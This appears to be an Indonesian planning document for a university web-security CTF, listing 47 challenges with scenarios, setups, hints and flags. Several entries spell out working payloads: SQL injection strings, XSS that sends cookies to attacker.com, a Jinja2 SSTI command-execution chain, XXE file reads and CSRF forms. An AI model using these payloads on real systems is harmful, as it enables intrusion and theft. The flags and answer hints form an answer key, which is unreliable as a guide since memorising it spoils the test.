# CTF PuTI — Identifikasi dan Perencanaan Soal

**Versi:** 1.0
**Status:** Draft
**Format Flag:** `puti{...}` (case sensitive)
**Target Peserta:** Mahasiswa Telkom University & umum
**Fokus:** Web Security (OWASP Top 10 + API Top 10 + WordPress) + Blue Team Defense

---

## 1. Pendahuluan

### 1.1 Tujuan

Dokumen ini mendefinisikan seluruh skenario soal untuk CTF PuTI yang diselenggarakan oleh Direktorat Pusat Teknologi Informasi (PuTI) Telkom University. Soal-soal dirancang untuk menguji kemampuan peserta dalam bidang keamanan siber, mencakup teknik ofensif (Red Team), keamanan API, keamanan WordPress, dan teknik defensif (Blue Team).

### 1.2 Target Peserta

- Mahasiswa Telkom University (utama)
- Umum (peserta eksternal)
- Asumsi: memiliki pengetahuan dasar jaringan, Linux, dan web technologies

### 1.3 Kompetisi

- **Format:** Jeopardy-style
- **Sistem:** CTFd
- **Tim:** 1-3 orang per tim
- **Durasi:** 6-8 jam

---

## 2. Aturan Main

| Aturan                 | Ketentuan                                                                       |
| ---------------------- | ------------------------------------------------------------------------------- |
| **Flag Format**        | `puti{...}` — case sensitive, tanpa spasi                                       |
| **Tools Allowed**      | Semua tools open source (nmap, sqlmap, Burp Suite Community, dll)               |
| **Actions Prohibited** | DoS pada infrastructure, social engineering, serangan fisik                     |
| **Hint System**        | Free hints (tanpa pengurangan poin) + Paid hints (mengurangi poin)              |
| **Scoring**            | Standard (fixed value) — tidak ada decay                                        |
| **Pembagian Soal**     | Red Team (22) + API Security (6) + WordPress (11) + Blue Team (8) = **47 soal** |

---

## 3. Kategori Red Team — OWASP Web Security

22 soal mencakup OWASP Top 10 (2021) dan WSTG (Web Security Testing Guide).

### 3.1 Information Gathering

#### RED-01: Hidden Recon

| Item                   | Detail                                                                                                          |
| ---------------------- | --------------------------------------------------------------------------------------------------------------- |
| **Kategori**           | Information Gathering                                                                                           |
| **Level**              | Beginner                                                                                                        |
| **Poin**               | 100                                                                                                             |
| **OWASP Top 10**       | —                                                                                                               |
| **WSTG Ref**           | WSTG-INFO-02, INFO-03, INFO-06                                                                                  |
| **Skenario**           | Website Telkom University fiktif. Temukan hidden endpoint dari `robots.txt`, lalu akses untuk mendapatkan flag. |
| **Flag**               | `puti{r3c0n_f1rst_st3p}`                                                                                        |
| **Setup**              | Nginx static site + `robots.txt` → `/hidden-secret-page.html`                                                   |
| **Hint (free)**        | "Cek `robots.txt` — sering ada petunjuk tersembunyi"                                                            |
| **Hint (paid, 15pts)** | "Gunakan `gobuster` dengan wordlist kecil untuk discover hidden paths"                                          |
| **Tags**               | reconnaissance, robots.txt, directory-discovery                                                                 |

---

### 3.2 Security Misconfiguration

#### RED-02: Config Slip

| Item                   | Detail                                                                                       |
| ---------------------- | -------------------------------------------------------------------------------------------- |
| **Kategori**           | Security Misconfiguration                                                                    |
| **Level**              | Beginner                                                                                     |
| **Poin**               | 150                                                                                          |
| **OWASP Top 10**       | A05 — Security Misconfiguration                                                              |
| **WSTG Ref**           | WSTG-CONF-02, CONF-05, CONF-06                                                               |
| **Skenario**           | Admin panel tidak sengaja terekspos. Cari tahu HTTP method apa yang bisa bypass autentikasi. |
| **Flag**               | `puti{m1sc0nf1g_4dm1n}`                                                                      |
| **Setup**              | Flask app: `/admin` hanya allow method `PUT` (bukan GET)                                     |
| **Hint (free)**        | "Coba berbagai HTTP method: PUT, PATCH, DELETE, OPTIONS"                                     |
| **Hint (paid, 20pts)** | "OPTIONS method akan mengembalikan allowed methods. Coba `curl -X PUT`"                      |
| **Tags**               | misconfiguration, http-methods, admin-panel                                                  |

---

### 3.3 Authentication & Session

#### RED-03: Broken Auth

| Item                   | Detail                                                                        |
| ---------------------- | ----------------------------------------------------------------------------- |
| **Kategori**           | Authentication Failures                                                       |
| **Level**              | Beginner                                                                      |
| **Poin**               | 150                                                                           |
| **OWASP Top 10**       | A07 — Auth Failures                                                           |
| **WSTG Ref**           | WSTG-ATHN-02, ATHN-03, ATHN-04                                                |
| **Skenario**           | Admin menggunakan default credentials. Login lalu dapatkan flag di dashboard. |
| **Flag**               | `puti{d3f4ult_cr3d3nt14ls}`                                                   |
| **Setup**              | Flask app: user `admin:admin123`. Flag di `/dashboard` setelah login.         |
| **Hint (free)**        | "Coba kombinasi umum: admin/admin, admin/ admin123, root/root"                |
| **Hint (paid, 15pts)** | "Default credentials: admin:admin123"                                         |
| **Tags**               | authentication, default-credentials, brute-force                              |

#### RED-04: JWT Forge

| Item                   | Detail                                                                                                 |
| ---------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kategori**           | JWT / Session Management                                                                               |
| **Level**              | Medium                                                                                                 |
| **Poin**               | 250                                                                                                    |
| **OWASP Top 10**       | A07 — Auth Failures                                                                                    |
| **WSTG Ref**           | WSTG-SESN-10                                                                                           |
| **Skenario**           | API menggunakan JWT dengan algoritma "none". Forge token untuk menjadi admin.                          |
| **Flag**               | `puti{jwt_n0n3_4lg_f0rg3ry}`                                                                           |
| **Setup**              | JWT: `{"alg":"none","typ":"JWT"}.{"user":"guest","admin":false}.` — signature kosong                   |
| **Hint (free)**        | "Decode JWT di jwt.io — apa yang bisa dimodifikasi?"                                                   |
| **Hint (paid, 30pts)** | "Ganti algorithm ke 'none', ubah payload jadi `{\"user\":\"admin\",\"admin\":true}`, signature kosong" |
| **Tags**               | jwt, authentication-bypass, token-forgery                                                              |

#### RED-05: Session Fixation

| Item                   | Detail                                                                                                   |
| ---------------------- | -------------------------------------------------------------------------------------------------------- |
| **Kategori**           | Session Management                                                                                       |
| **Level**              | Medium                                                                                                   |
| **Poin**               | 250                                                                                                      |
| **OWASP Top 10**       | A07 — Auth Failures                                                                                      |
| **WSTG Ref**           | WSTG-SESN-03                                                                                             |
| **Skenario**           | Aplikasi tidak regenerate session ID setelah login. Set session sebelum login, lalu dapatkan akses.      |
| **Flag**               | `puti{s3ss10n_f1x4t10n}`                                                                                 |
| **Setup**              | Flask tanpa `regenerate_session()`. Parameter `?session=attacker_session`                                |
| **Hint (free)**        | "Coba akses dengan ?session=test, lalu login — apakah session berubah?"                                  |
| **Hint (paid, 25pts)** | "Session ID tidak berubah setelah login. Set session sebelum login, dapatkan akses setelah korban login" |
| **Tags**               | session-fixation, session-management, hijacking                                                          |

---

### 3.4 Broken Access Control

#### RED-06: IDOR Challenge

| Item                   | Detail                                                                                      |
| ---------------------- | ------------------------------------------------------------------------------------------- |
| **Kategori**           | Broken Access Control                                                                       |
| **Level**              | Medium                                                                                      |
| **Poin**               | 200                                                                                         |
| **OWASP Top 10**       | A01 — Broken Access Control                                                                 |
| **WSTG Ref**           | WSTG-ATHZ-04                                                                                |
| **Skenario**           | Ubah parameter ID di URL untuk akses profil user lain. Flag ada di profil admin (ID: 1337). |
| **Flag**               | `puti{1d0r_br0k3n_4cc3ss}`                                                                  |
| **Setup**              | Login `user1:user123`. Ganti `?id=1337` untuk lihat profil admin.                           |
| **Hint (free)**        | "Coba ganti angka ID di URL — apakah dicek kepemilikannya?"                                 |
| **Hint (paid, 20pts)** | "Coba `id=1337` — admin punya akses ke flag"                                                |
| **Tags**               | idor, broken-access-control, authorization                                                  |

#### RED-07: CSRF Attack

| Item                   | Detail                                                                                                                                                                                    |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Kategori**           | CSRF                                                                                                                                                                                      |
| **Level**              | Medium                                                                                                                                                                                    |
| **Poin**               | 200                                                                                                                                                                                       |
| **OWASP Top 10**       | A01 — Broken Access Control                                                                                                                                                               |
| **WSTG Ref**           | WSTG-SESN-05                                                                                                                                                                              |
| **Skenario**           | Endpoint change email tanpa CSRF token. Buat halaman HTML auto-submit untuk mengubah email korban.                                                                                        |
| **Flag**               | `puti{csrf_pr0t3ct10n_n33d3d}`                                                                                                                                                            |
| **Setup**              | Form `/change-email` tanpa CSRF token. Bot visit halaman attacker.                                                                                                                        |
| **Hint (free)**        | "Buat halaman HTML dengan form auto-submit via JavaScript"                                                                                                                                |
| **Hint (paid, 20pts)** | "Gunakan `<form action=\"/change-email\" method=\"POST\" id=\"csrf\"><input name=\"email\" value=\"attacker@evil.com\"></form><script>document.getElementById('csrf').submit()</script>`" |
| **Tags**               | csrf, cross-site-request-forgery, bot                                                                                                                                                     |

#### RED-18: Broken Access Control — Multi-Layer

| Item             | Detail                                                                                             |
| ---------------- | -------------------------------------------------------------------------------------------------- |
| **Kategori**     | Broken Access Control                                                                              |
| **Level**        | Medium-Hard                                                                                        |
| **Poin**         | 300 (3 layer @ 100pts)                                                                             |
| **OWASP Top 10** | A01 — Broken Access Control                                                                        |
| **WSTG Ref**     | WSTG-ATHZ-02, ATHZ-03                                                                              |
| **Skenario**     | Website e-commerce fiktif dengan 3 lapis broken access control yang harus dieksploitasi berurutan. |
| **Flag**         | `puti{bac_pr1v3sc_4dm1n}`                                                                          |

**Layer 1 — Directory Traversal (100pts):**

- Endpoint `/download?file=invoice_1.pdf` tanpa sanitasi path
- `../../../etc/passwd` untuk baca file sistem
- Sub-flag: `puti{path_tr4v3rs4l_m4st3r}`

**Layer 2 — Horizontal Privilege Escalation (100pts):**

- Dashboard `/dashboard?user_id=1` tanpa ownership check
- Ganti `user_id=2` lihat dashboard admin
- Sub-flag: `puti{h0r1z0nt4l_pr1v3sc}`

**Layer 3 — Vertical Privilege Escalation (100pts):**

- API `PATCH /api/profile` — tambah `"role": "admin"` di request body
- Atau: hidden form field `role=user` diganti jadi `role=admin`
- Sub-flag: `puti{v3rt1c4l_pr1v3sc_2_4dm1n}`

| **Tags** | path-traversal, privilege-escalation, authorization-bypass |

---

### 3.5 Injection — SQL Injection

#### RED-08: SQLi — Error Based / UNION

| Item                   | Detail                                                                           |
| ---------------------- | -------------------------------------------------------------------------------- |
| **Kategori**           | SQL Injection                                                                    |
| **Level**              | Easy-Medium                                                                      |
| **Poin**               | 150                                                                              |
| **OWASP Top 10**       | A03 — Injection                                                                  |
| **WSTG Ref**           | WSTG-INPV-05.2 (MySQL)                                                           |
| **Skenario**           | Login form vulnerable. Bypass auth lalu UNION SELECT untuk baca tabel `secrets`. |
| **Flag**               | `puti{un1on_s3l3ct_1s_k3y}`                                                      |
| **Setup**              | SQLite DB: tabel `users(id, username, password)` + `secrets(id, flag)`           |
| **Payload**            | `' UNION SELECT 1,flag,3 FROM secrets --`                                        |
| **Hint (paid, 20pts)** | "Gunakan UNION SELECT: `' UNION SELECT 1,flag,3 FROM secrets --`"                |
| **Tags**               | sqli, union, database-injection, mysql                                           |

#### RED-09: SQLi — Blind Boolean

| Item             | Detail                                                                                     |
| ---------------- | ------------------------------------------------------------------------------------------ |
| **Kategori**     | SQL Injection                                                                              |
| **Level**        | Medium                                                                                     |
| **Poin**         | 250                                                                                        |
| **OWASP Top 10** | A03 — Injection                                                                            |
| **WSTG Ref**     | WSTG-INPV-05.2                                                                             |
| **Skenario**     | Login hanya mengembalikan "Success" vs "Failed". Extract flag per karakter secara boolean. |
| **Flag**         | `puti{bl1nd_boolean_sql1}`                                                                 |
| **Teknik**       | `' OR (SELECT SUBSTRING(flag,1,1) FROM secrets)='p' --`                                    |
| **Solusi**       | Script Python: iterate karakter `a-z0-9{}_` → cek TRUE/FALSE per karakter                  |
| **Tags**         | sqli, blind-boolean, inference                                                             |

#### RED-10: SQLi — Time Based

| Item             | Detail                                                                            |
| ---------------- | --------------------------------------------------------------------------------- |
| **Kategori**     | SQL Injection                                                                     |
| **Level**        | Hard                                                                              |
| **Poin**         | 300                                                                               |
| **OWASP Top 10** | A03 — Injection                                                                   |
| **WSTG Ref**     | WSTG-INPV-05.2                                                                    |
| **Skenario**     | Response selalu sama — bedanya hanya delay waktu. Ekstrak flag via timing attack. |
| **Flag**         | `puti{t1m3_b4s3d_sql1_d3t3ct}`                                                    |
| **Teknik**       | `' OR IF(SUBSTRING(flag,1,1)='p',SLEEP(3),0) --`                                  |
| **Setup**        | MySQL/MariaDB dengan SLEEP() function enabled                                     |
| **Tags**         | sqli, blind-timebased, timing-attack                                              |

---

### 3.6 Injection — XSS (Cross-Site Scripting)

#### RED-11: XSS — Reflected

| Item             | Detail                                                                             |
| ---------------- | ---------------------------------------------------------------------------------- |
| **Kategori**     | Cross-Site Scripting                                                               |
| **Level**        | Medium                                                                             |
| **Poin**         | 200                                                                                |
| **OWASP Top 10** | A03 — Injection                                                                    |
| **WSTG Ref**     | WSTG-INPV-01                                                                       |
| **Skenario**     | Search form merefleksikan input tanpa sanitasi. Admin bot visit URL yang disubmit. |
| **Flag**         | `puti{r3fl3ct3d_xss_m4st3r}`                                                       |
| **Setup**        | Flask: `render_template_string(f"<h2>Search: {q}</h2>")` + headless browser bot    |
| **Payload**      | `"><script>fetch('https://attacker.com/?c='+document.cookie)</script>`             |
| **Tags**         | xss, reflected, cross-site-scripting                                               |

#### RED-12: XSS — Stored

| Item             | Detail                                                                               |
| ---------------- | ------------------------------------------------------------------------------------ |
| **Kategori**     | Cross-Site Scripting                                                                 |
| **Level**        | Medium                                                                               |
| **Poin**         | 250                                                                                  |
| **OWASP Top 10** | A03 — Injection                                                                      |
| **WSTG Ref**     | WSTG-INPV-02                                                                         |
| **Skenario**     | Form komentar menyimpan input tanpa sanitasi. Semua pengunjung mengeksekusi payload. |
| **Flag**         | `puti{st0r3d_xss_p3rs1st3nt}`                                                        |
| **Setup**        | Form komentar → DB → tampil di halaman. Bot visit setiap 30 detik.                   |
| **Tags**         | xss, stored, persistent, cross-site-scripting                                        |

#### RED-13: XSS — DOM-based

| Item             | Detail                                                                              |
| ---------------- | ----------------------------------------------------------------------------------- |
| **Kategori**     | Cross-Site Scripting                                                                |
| **Level**        | Medium                                                                              |
| **Poin**         | 250                                                                                 |
| **OWASP Top 10** | A03 — Injection                                                                     |
| **WSTG Ref**     | WSTG-CLNT-01                                                                        |
| **Skenario**     | Client-side JS memproses URL hash tanpa sanitasi. Tidak ada server-side reflection. |
| **Flag**         | `puti{dom_xss_cl13nt_s1d3}`                                                         |
| **Setup**        | Static HTML: `document.getElementById('out').innerHTML = location.hash`             |
| **Payload**      | `#<img src=x onerror="fetch('https://attacker.com/'+document.cookie)">`             |
| **Tags**         | xss, dom-based, client-side                                                         |

---

### 3.7 Advanced Injection

#### RED-14: SSRF Me

| Item                   | Detail                                                                              |
| ---------------------- | ----------------------------------------------------------------------------------- |
| **Kategori**           | Server-Side Request Forgery                                                         |
| **Level**              | Hard                                                                                |
| **Poin**               | 300                                                                                 |
| **OWASP Top 10**       | A10 — SSRF                                                                          |
| **WSTG Ref**           | WSTG-INPV-19                                                                        |
| **Skenario**           | Fitur "fetch URL" bisa akses internal service `localhost:5000` yang menyimpan flag. |
| **Flag**               | `puti{ssrf_t0_1nt3rn4l}`                                                            |
| **Setup**              | Flask app: `/fetch?url=` + internal service di port 5000.                           |
| **Hint (paid, 30pts)** | "Coba akses `http://localhost:5000/admin` via parameter URL"                        |
| **Tags**               | ssrf, server-side-request-forgery, internal-network                                 |

#### RED-15: SSTI Exploit

| Item                   | Detail                                                                                                                                        |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| **Kategori**           | Server-Side Template Injection                                                                                                                |
| **Level**              | Hard                                                                                                                                          |
| **Poin**               | 300                                                                                                                                           |
| **OWASP Top 10**       | A03 — Injection                                                                                                                               |
| **WSTG Ref**           | WSTG-INPV-18                                                                                                                                  |
| **Skenario**           | Fitur preview name menggunakan Jinja2 tanpa escaping. Eksekusi code OS untuk baca `/flag.txt`.                                                |
| **Flag**               | `puti{sst1_t3mpl4t3_1nj3ct10n}`                                                                                                               |
| **Setup**              | Flask: `render_template_string("Hello " + name)`                                                                                              |
| **Payload**            | `{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}`                                                               |
| **Hint (paid, 40pts)** | "Coba `{{7*7}}` — jika menghasilkan 49, berarti SSTI. Chain: `{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}`" |
| **Tags**               | ssti, template-injection, jinja2, rce                                                                                                         |

#### RED-16: XXE Attack

| Item                   | Detail                                                                                                                                  |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Kategori**           | XML External Entity                                                                                                                     |
| **Level**              | Hard                                                                                                                                    |
| **Poin**               | 350                                                                                                                                     |
| **OWASP Top 10**       | A05 — Security Misconfiguration                                                                                                         |
| **WSTG Ref**           | WSTG-INPV-07                                                                                                                            |
| **Skenario**           | API XML parser tidak disable external entities. Baca file `/flag.txt`.                                                                  |
| **Flag**               | `puti{xxe_3xt3rn4l_3nt1ty}`                                                                                                             |
| **Setup**              | Flask: `etree.fromstring(request.data)` tanpa entity resolver                                                                           |
| **Payload**            | `<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><root>&xxe;</root>`                                   |
| **Hint (paid, 40pts)** | "Coba upload XML dengan DOCTYPE: `<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><root>&xxe;</root>`" |
| **Tags**               | xxe, xml-injection, external-entity, file-read                                                                                          |

---

### 3.8 Security Headers

#### RED-19: CSP Bypass

| Item                   | Detail                                                                                                                                                                           |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Kategori**           | CSP Bypass                                                                                                                                                                       |
| **Level**              | Medium-Hard                                                                                                                                                                      |
| **Poin**               | 300                                                                                                                                                                              |
| **OWASP Top 10**       | A05 — Security Misconfiguration                                                                                                                                                  |
| **WSTG Ref**           | WSTG-CONF-12                                                                                                                                                                     |
| **Skenario**           | CSP whitelist CDN (`cdnjs.cloudflare.com`) bisa dieksploitasi via AngularJS sandbox escape.                                                                                      |
| **Flag**               | `puti{csp_cdn_byp4ss_w1th_4ngul4r}`                                                                                                                                              |
| **Setup**              | Flask app dengan XSS + CSP: `script-src 'self' cdnjs.cloudflare.com`                                                                                                             |
| **Hint (paid, 40pts)** | "Load AngularJS dari cdnjs: `<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script>` lalu `{{constructor.constructor('alert(1)')()}}`" |
| **Tags**               | csp-bypass, content-security-policy, angularjs                                                                                                                                   |

3 sub-techniques:

| Sub | Teknik            | Sub-Flag                   |
| --- | ----------------- | -------------------------- |
| 19a | JSONP Bypass      | `puti{csp_j50np_c4llb4ck}` |
| 19b | CDN Library Abuse | `puti{csp_l1br4ry_byp4ss}` |
| 19c | CSP Report Exfil  | `puti{csp_r3p0rt_exf1l}`   |

#### RED-20: Security Headers Audit

| Item             | Detail                                                                      |
| ---------------- | --------------------------------------------------------------------------- |
| **Kategori**     | Security Headers                                                            |
| **Level**        | Beginner-Medium                                                             |
| **Poin**         | 150                                                                         |
| **OWASP Top 10** | A05 — Security Misconfiguration                                             |
| **WSTG Ref**     | WSTG-CONF-07, CONF-12, CONF-14                                              |
| **Skenario**     | 6 security headers hilang atau misconfigured. Identifikasi dan eksploitasi. |
| **Flag**         | `puti{s3cur1ty_h34d3r5_4ud1t}`                                              |

6 header issues: Clickjacking (X-Frame-Options), MIME Sniffing (X-Content-Type-Options), HSTS missing, CSP unsafe-inline, Referrer Policy leak, Cross-Domain Policy.

#### RED-21: HSTS Bypass & Cookie Theft

| Item         | Detail                                |
| ------------ | ------------------------------------- |
| **Kategori** | HSTS / Cookie                         |
| **Level**    | Medium                                |
| **Poin**     | 250                                   |
| **WSTG Ref** | WSTG-CONF-07, SESN-02                 |
| **Flag**     | `puti{hsts_c00ki3_th3ft}`             |
| **Tags**     | hsts, cookie-theft, session-hijacking |

#### RED-22: CORS Misconfiguration

| Item         | Detail                               |
| ------------ | ------------------------------------ |
| **Kategori** | CORS                                 |
| **Level**    | Medium                               |
| **Poin**     | 250                                  |
| **WSTG Ref** | WSTG-CLNT-07                         |
| **Flag**     | `puti{c0rs_m1sc0nf1g_l34k}`          |
| **Tags**     | cors, cross-origin, misconfiguration |

3 levels: Basic (reflected origin), Wildcard (\* with credentials), Null Origin (iframe/data URI).

---

### 3.9 XML-RPC WordPress

#### RED-17: XML-RPC Attack

| Item             | Detail                                                                                                      |
| ---------------- | ----------------------------------------------------------------------------------------------------------- |
| **Kategori**     | WordPress Security                                                                                          |
| **Level**        | Medium                                                                                                      |
| **Poin**         | 250                                                                                                         |
| **OWASP Top 10** | A07 + A05                                                                                                   |
| **OWASP API**    | API4                                                                                                        |
| **Skenario**     | WordPress dengan `xmlrpc.php` aktif. 3 sub-challenge: brute force multicall, SSRF pingback, cloud metadata. |
| **Flag**         | `puti{xmlrpc_brut3f0rc3_m4st3r}`                                                                            |

3 sub-challenges:

| Sub | Teknik                    | Detail                                 | Sub-Flag                       |
| --- | ------------------------- | -------------------------------------- | ------------------------------ |
| 17a | Brute Force via multicall | 1000 passwords dalam 1 request         | `puti{xmlrpc_mult1c4ll_brut3}` |
| 17b | SSRF via pingback         | Port scanning internal via fault codes | `puti{xmlrpc_p1ngb4ck_ssrf}`   |
| 17c | SSRF to Cloud Metadata    | Akses AWS/GCP metadata endpoint        | `puti{xmlrpc_cl0ud_m3t4d4ta}`  |

**Tags:** xmlrpc, wordpress, ssrf, brute-force, cloud-metadata

---

## 4. Kategori API Security — OWASP API Top 10

6 soal mencakup OWASP API Security Top 10.

#### API-01: BOLA — IDOR via API

| Item          | Detail                                                                          |
| ------------- | ------------------------------------------------------------------------------- |
| **Level**     | Medium                                                                          |
| **Poin**      | 200                                                                             |
| **OWASP API** | API1 — BOLA                                                                     |
| **WSTG Ref**  | WSTG-API-02                                                                     |
| **Skenario**  | API `GET /api/v2/users/{id}` — ganti ID untuk akses data user admin (ID: 1337). |
| **Flag**      | `puti{api_bola_1d0r_1337}`                                                      |
| **Tags**      | api-security, bola, idor                                                        |

#### API-02: Excessive Data Exposure

| Item          | Detail                                                                      |
| ------------- | --------------------------------------------------------------------------- |
| **Level**     | Medium                                                                      |
| **Poin**      | 200                                                                         |
| **OWASP API** | API3                                                                        |
| **Skenario**  | API return terlalu banyak field termasuk `password_hash` dan `secret_flag`. |
| **Flag**      | `puti{api_exc3ss1v3_data_l34k}`                                             |
| **Tags**      | api-security, data-leakage                                                  |

#### API-03: Mass Assignment

| Item          | Detail                                                                       |
| ------------- | ---------------------------------------------------------------------------- |
| **Level**     | Medium-Hard                                                                  |
| **Poin**      | 250                                                                          |
| **OWASP API** | API6                                                                         |
| **Skenario**  | `PATCH /api/v2/users/me` — tambah field `is_admin: true` untuk upgrade role. |
| **Flag**      | `puti{api_m4ss_4ss1gnm3nt}`                                                  |
| **Tags**      | api-security, mass-assignment                                                |

#### API-04: BFLA — Privilege Escalation

| Item          | Detail                                                   |
| ------------- | -------------------------------------------------------- |
| **Level**     | Medium                                                   |
| **Poin**      | 250                                                      |
| **OWASP API** | API5                                                     |
| **Skenario**  | `DELETE /api/v2/users/{id}` tanpa pengecekan role admin. |
| **Flag**      | `puti{api_bfla_adm1n_d3l3t3}`                            |
| **Tags**      | api-security, bfla, privilege-escalation                 |

#### API-05: Improper Assets Management

| Item          | Detail                                                                  |
| ------------- | ----------------------------------------------------------------------- |
| **Level**     | Medium                                                                  |
| **Poin**      | 200                                                                     |
| **OWASP API** | API9                                                                    |
| **Skenario**  | API v1 lama masih aktif tanpa autentikasi. Flag ada di `/api/v1/flags`. |
| **Flag**      | `puti{api_v1_d3pr3c4t3d_l34k}`                                          |
| **Tags**      | api-security, versioning, deprecated-api                                |

#### API-06: GraphQL Introspection

| Item          | Detail                                                                                        |
| ------------- | --------------------------------------------------------------------------------------------- |
| **Level**     | Hard                                                                                          |
| **Poin**      | 350                                                                                           |
| **OWASP API** | API3 + API9                                                                                   |
| **WSTG Ref**  | WSTG-API-99                                                                                   |
| **Skenario**  | GraphQL endpoint dengan introspection enabled. Query schema untuk temukan mutation `getFlag`. |
| **Flag**      | `puti{graphql_1ntr0sp3ct}`                                                                    |
| **Tags**      | graphql, introspection, api-security                                                          |

---

## 5. Kategori WordPress Security

11 soal mencakup keamanan WordPress — relevan dengan teknologi website Telkom University.

#### WP-01: XML-RPC Brute Force (Multicall)

| Item         | Detail                                                                   |
| ------------ | ------------------------------------------------------------------------ |
| **Level**    | Beginner                                                                 |
| **Poin**     | 150                                                                      |
| **Skenario** | `xmlrpc.php` dengan `system.multicall` — 1000 passwords dalam 1 request. |
| **Flag**     | `puti{wp_xmlrpc_mult1c4ll}`                                              |
| **Tags**     | wordpress, xmlrpc, brute-force                                           |

#### WP-02: XML-RPC Pingback SSRF

| Item         | Detail                                                         |
| ------------ | -------------------------------------------------------------- |
| **Level**    | Medium                                                         |
| **Poin**     | 250                                                            |
| **Skenario** | `pingback.ping` untuk port scanning internal + cloud metadata. |
| **Flag**     | `puti{wp_xmlrpc_p1ngb4ck}`                                     |
| **Tags**     | wordpress, xmlrpc, ssrf                                        |

#### WP-03: REST API User Enumeration (CVE-2017-5487)

| Item         | Detail                                                             |
| ------------ | ------------------------------------------------------------------ |
| **Level**    | Beginner                                                           |
| **Poin**     | 100                                                                |
| **Skenario** | `GET /wp-json/wp/v2/users` — enumerasi username tanpa autentikasi. |
| **Flag**     | `puti{wp_us3r_3num}`                                               |
| **Tags**     | wordpress, user-enumeration, cve-2017-5487                         |

#### WP-04: SQL Injection via Plugin

| Item         | Detail                                                                    |
| ------------ | ------------------------------------------------------------------------- |
| **Level**    | Medium                                                                    |
| **Poin**     | 250                                                                       |
| **Skenario** | Plugin dengan `$wpdb->prepare()` misused — UNION SQLi dump password hash. |
| **Flag**     | `puti{wp_sql1_plum81n}`                                                   |
| **Tags**     | wordpress, sqli, plugin                                                   |

#### WP-05: PHP Object Injection → RCE (POP Chain)

| Item         | Detail                                           |
| ------------ | ------------------------------------------------ |
| **Level**    | Hard                                             |
| **Poin**     | 400                                              |
| **Skenario** | Plugin dengan `unserialize()` — POP chain → RCE. |
| **Flag**     | `puti{wp_pop_ch41n_rce}`                         |
| **Tags**     | wordpress, deserialization, rce                  |

#### WP-06: Arbitrary File Upload → RCE

| Item         | Detail                                                |
| ------------ | ----------------------------------------------------- |
| **Level**    | Easy-Medium                                           |
| **Poin**     | 200                                                   |
| **Skenario** | Upload PHP webshell via AJAX endpoint tanpa validasi. |
| **Flag**     | `puti{wp_f1l3_upl04d_sh3ll}`                          |
| **Tags**     | wordpress, file-upload, rce                           |

#### WP-07: LFI + Log Poisoning → RCE

| Item         | Detail                                          |
| ------------ | ----------------------------------------------- |
| **Level**    | Medium                                          |
| **Poin**     | 300                                             |
| **Skenario** | LFI parameter + Apache log poisoning untuk RCE. |
| **Flag**     | `puti{wp_lf1_l0g_p01s0n}`                       |
| **Tags**     | wordpress, lfi, log-poisoning, rce              |

#### WP-08: Privilege Escalation Subscriber → Admin

| Item         | Detail                                                                            |
| ------------ | --------------------------------------------------------------------------------- |
| **Level**    | Easy                                                                              |
| **Poin**     | 150                                                                               |
| **Skenario** | AJAX endpoint tanpa capability check — ubah `wp_capabilities` jadi administrator. |
| **Flag**     | `puti{wp_pr1v3sc_2_4dm1n}`                                                        |
| **Tags**     | wordpress, privilege-escalation, broken-access-control                            |

#### WP-09: Stored XSS in Comments

| Item         | Detail                                                       |
| ------------ | ------------------------------------------------------------ |
| **Level**    | Medium                                                       |
| **Poin**     | 250                                                          |
| **Skenario** | Komentar tanpa sanitasi + admin bot. XSS untuk cookie theft. |
| **Flag**     | `puti{wp_c0mm3nt_xss}`                                       |
| **Tags**     | wordpress, xss, stored, cookie-theft                         |

#### WP-10: wp-config.php Exposure via Backup

| Item         | Detail                                                      |
| ------------ | ----------------------------------------------------------- |
| **Level**    | Easy                                                        |
| **Poin**     | 150                                                         |
| **Skenario** | Backup file `wp-config.php.bak` terekspos → DB credentials. |
| **Flag**     | `puti{wp_c0nf1g_b4kup}`                                     |
| **Tags**     | wordpress, misconfiguration, sensitive-data                 |

#### WP-11: REST API Permission Callback Omission

| Item         | Detail                                                             |
| ------------ | ------------------------------------------------------------------ |
| **Level**    | Easy                                                               |
| **Poin**     | 150                                                                |
| **Skenario** | REST API endpoint tanpa `permission_callback` — create admin user. |
| **Flag**     | `puti{wp_r3st_n0_p3rm}`                                            |
| **Tags**     | wordpress, rest-api, broken-access-control                         |

---

## 6. Kategori Blue Team — Defense & Detection

8 soal mencakup deteksi serangan, forensik, dan incident response.

#### BLU-01: Log Hunter — SQLi Detection

| Item                 | Detail                                                                                                                        |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| **Level**            | Beginner                                                                                                                      |
| **Poin**             | 100                                                                                                                           |
| **Serangan Terkait** | RED-08, RED-09, RED-10 (SQL Injection)                                                                                        |
| **Skenario**         | File `access.log` berisi request SQLi. Temukan baris yang mengandung percobaan SQL Injection. Flag adalah timestamp serangan. |
| **Flag**             | `puti{SQLi_d3t3ct3d_20260708120000}`                                                                                          |
| **File**             | `access.log` (10.000 baris, 5 di antaranya SQLi)                                                                              |
| **Tags**             | log-analysis, sqli-detection, blue-team                                                                                       |

#### BLU-02: Log Hunter — XSS Detection

| Item                 | Detail                                 |
| -------------------- | -------------------------------------- |
| **Level**            | Beginner                               |
| **Poin**             | 100                                    |
| **Serangan Terkait** | RED-11, RED-12, RED-13 (XSS)           |
| **Flag**             | `puti{xss_d3t3ct3d_20260708120000}`    |
| **File**             | `access.log` (XSS variant)             |
| **Tags**             | log-analysis, xss-detection, blue-team |

#### BLU-03: PCAP Detective — Network Forensics

| Item                 | Detail                                                       |
| -------------------- | ------------------------------------------------------------ |
| **Level**            | Medium                                                       |
| **Poin**             | 200                                                          |
| **Serangan Terkait** | RED-14 (SSRF)                                                |
| **Skenario**         | PCAP berisi serangan SSRF. Temukan IP internal yang diakses. |
| **Flag**             | `puti{pcap_ssrf_d3t3ct_10.0.0.5}`                            |
